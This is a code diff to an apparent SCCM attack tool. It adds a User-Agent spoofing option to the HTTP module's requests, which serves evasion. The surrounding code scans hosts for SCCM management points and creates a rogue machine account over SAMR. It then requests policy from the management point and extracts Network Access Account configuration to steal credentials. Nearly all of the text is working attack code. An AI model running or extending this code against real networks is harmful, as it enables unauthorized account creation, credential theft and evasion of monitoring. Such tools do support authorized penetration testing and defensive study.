@@ -5,6 +5,7 @@ from lib.attacks.find import SCCMHUNTER
 from lib.scripts.addcomputer import AddComputerSAMR
 from lib.scripts.sccmwtf import SCCMTools, Tools
 from lib.scripts.banner import show_banner
+from lib.constants import WELLKNOWN_USER_AGENTS
 import requests
 import getpass
 import random
@@ -17,11 +18,11 @@ import re
 
 
 class HTTP:
-    
-    def __init__(self, username=None, password=None, domain=None, target_dom=None, 
-                    dc_ip=None,ldaps=False, kerberos=False, no_pass=False, hashes=None, 
+
+    def __init__(self, username=None, password=None, domain=None, target_dom=None,
+                    dc_ip=None,ldaps=False, kerberos=False, no_pass=False, hashes=None,
                     aes=None, debug=False, auto=False, computer_pass=None, computer_name=None,
-                    uuid=None, mp=None, sleep=None, logs_dir=None):
+                    uuid=None, mp=None, sleep=None, logs_dir=None, user_agent_rewrite=None):
         self.username = username
         self.password = password
         self.domain = domain
@@ -45,9 +46,19 @@ class HTTP:
         self.logs_dir = logs_dir
         self.database = f"{logs_dir}/db/find.db"
         self.conn = sqlite3.connect(self.database, check_same_thread=False)
+        self.user_agent_rewrite = user_agent_rewrite
+        self.user_agent = ""
+        self.headers = {}
 
- 
     def run(self):
+        # Overwrite User Agent if option is selected
+        if self.user_agent_rewrite:
+            try:
+                self.user_agent = WELLKNOWN_USER_AGENTS[self.user_agent_rewrite]
+                self.headers = {'User-Agent' : self.user_agent}
+            except Exception as e:
+                logger.info("User Agent rewrite failed, please select a valid User Agent or remove the -uar argument")
+
         if self.uuid:
             self.manual_request()
             return
@@ -61,7 +72,7 @@ class HTTP:
                     targets.add(mp[0])
                 for mp in allcompscheck:
                     targets.add(mp[0])
-                
+
                 self.targets = self.http_hunter(targets)
                 #print(targets)
                 if self.targets:
@@ -77,12 +88,13 @@ class HTTP:
         try:
             #TODO: Need some terminal output for actions taken
             #      Need better error handling
+            #      Add User Agent rewrite, however currently User-Agents are specified here so sanity check is needed first
             target_mp_url = f"http://{self.mp}"
             sccmwtf = SCCMTools(target_name="", target_fqdn="", target_sccm=target_mp_url, target_username="", target_password="", sleep=self.sleep, logs_dir=self.logs_dir)
             with open (f"{self.logs_dir}/{self.uuid}.data", "rb") as f:
                 data = f.read()
             with open (f"{self.logs_dir}/{self.uuid}.pem", "rb") as g:
-                key = serialization.load_pem_private_key(g.read(), password=b"mimikatz")           
+                key = serialization.load_pem_private_key(g.read(), password=b"mimikatz")
             deflatedData = sccmwtf.sendCCMPostRequest(data=data, mp=target_mp_url)
             result = re.search("PolicyCategory=\"NAAConfig\".*?<!\[CDATA\[https*://<mp>([^]]+)", deflatedData, re.DOTALL + re.MULTILINE)
             urls = [result.group(1)]
@@ -111,7 +123,7 @@ class HTTP:
                         )
             self.computer_name = f'DESKTOP-' + (''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8)) + '$')
             self.computer_pass = f''.join(random.choice(string.ascii_letters + string.digits) for _ in range(12))
-            samradd = AddComputerSAMR(self.username, self.password, self.domain, self.hashes, self.aes, self.kerberos, 
+            samradd = AddComputerSAMR(self.username, self.password, self.domain, self.hashes, self.aes, self.kerberos,
                                    self.dc_ip, self.computer_name, self.computer_pass)
             samradd.run()
 
@@ -119,7 +131,7 @@ class HTTP:
                 logger.info(f'[+] {self.computer_name} created with password: {self.computer_pass}')
             else:
                 logger.info(f'[-] Could not validate successful creation.')
-        
+
         if not (self.computer_name or self.computer_pass):
             logger.info("[-] Missing machine account credentials, check your arguments and try again.")
             sys.exit()
@@ -139,13 +151,13 @@ class HTTP:
                 logger.info(e)
 
     def http_hunter(self, servers):
-        validated = []                   
+        validated = []
         for server in servers:
             url=(f"http://{server}/ccm_system_windowsauth")
             url2=(f"http://{server}/ccm_system")
             try:
-                x = requests.get(url, timeout=5)
-                x2 = requests.get(url2,timeout=5)
+                x = requests.get(url, headers=self.headers, timeout=5)
+                x2 = requests.get(url2, headers=self.headers, timeout=5)
                 if x.status_code == 401:
                     logger.info(f"[+] Found {url}")
                     validated.append(server)
@@ -163,7 +175,7 @@ class HTTP:
     def validate_add(self, computername):
         lmhash = ""
         nthash = ""
-        
+
         if self.hashes:
             lmhash, nthash = self.hashes.split(':')
         if not (self.password or self.hashes or self.aes or self.no_pass):
@@ -177,14 +189,14 @@ class HTTP:
 
         try:
             ldap_server, self.ldap_session = init_ldap_session(domain=self.domain, username=self.username, password=self.password,
-                                                           lmhash=lmhash, nthash=nthash, kerberos=self.kerberos, domain_controller=self.dc_ip, 
+                                                           lmhash=lmhash, nthash=nthash, kerberos=self.kerberos, domain_controller=self.dc_ip,
                                                            aesKey=self.aes, hashes=self.hashes, ldaps=self.ldaps)
             logger.debug(f'[+] Bind successful {ldap_server}')
             try:
                 controls = ldap3.protocol.microsoft.security_descriptor_control(sdflags=0x07)
-                self.ldap_session.extend.standard.paged_search(self.search_base, 
-                                                               search_filter=f"(samaccountname={computername})", 
-                                                               attributes="nTSecurityDescriptor", 
+                self.ldap_session.extend.standard.paged_search(self.search_base,
+                                                               search_filter=f"(samaccountname={computername})",
+                                                               attributes="nTSecurityDescriptor",
                                                                generator=False)
                 return True
             except ldap3.core.exceptions.LDAPAttributeError as e:
@@ -192,7 +204,7 @@ class HTTP:
                 logger.info(f'[-] Error: {str(e)}')
                 return False
 
-        except ldap3.core.exceptions.LDAPSocketOpenError as e: 
+        except ldap3.core.exceptions.LDAPSocketOpenError as e:
             if 'invalid server address' in str(e):
                 logger.info(f'[-] Invalid server address - {self.domain}')
             else:
@@ -203,12 +215,12 @@ class HTTP:
         except ldap3.core.exceptions.LDAPBindError as e:
             logger.info(f'[-] Error: {str(e)}')
             return False
-        
+
 
     def get_dn(self, domain):
         components = domain.split('.')
         base = ''
         for comp in components:
             base += f',DC={comp}'
-        
+
         return base[1:]
